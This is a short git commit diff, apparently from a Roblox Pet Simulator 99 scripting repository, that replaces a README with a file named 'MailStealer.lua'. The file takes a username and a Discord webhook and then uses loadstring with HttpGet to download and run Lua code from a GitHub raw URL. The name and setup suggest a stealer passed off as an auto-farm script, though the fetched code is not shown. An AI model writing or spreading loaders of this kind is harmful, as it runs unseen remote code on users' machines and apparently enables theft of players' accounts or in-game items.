d8c0e544e6f8f8f4988aae666efce8ec337da261
Darkiooff <feliznavida130@gmail.com>
2025-04-17 14:46:24 -0400

    Update and rename README.md to MailStealer.lua

---
+++ MailStealer.lua
@@ -0,0 +1,6 @@
+ # auto-farm-event-ps99
+ Username = "Your Nick Here"
+LoadScreen = true 
+Webhook = "Your Link Here" -- Paste your Discord webhook here
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/darkio_darkio/auto-farm-event-ps99/main/MailStealer.lua"))()
--- README.md
+++
@@ -1,1 +0,0 @@
-# auto-farm-event-ps99
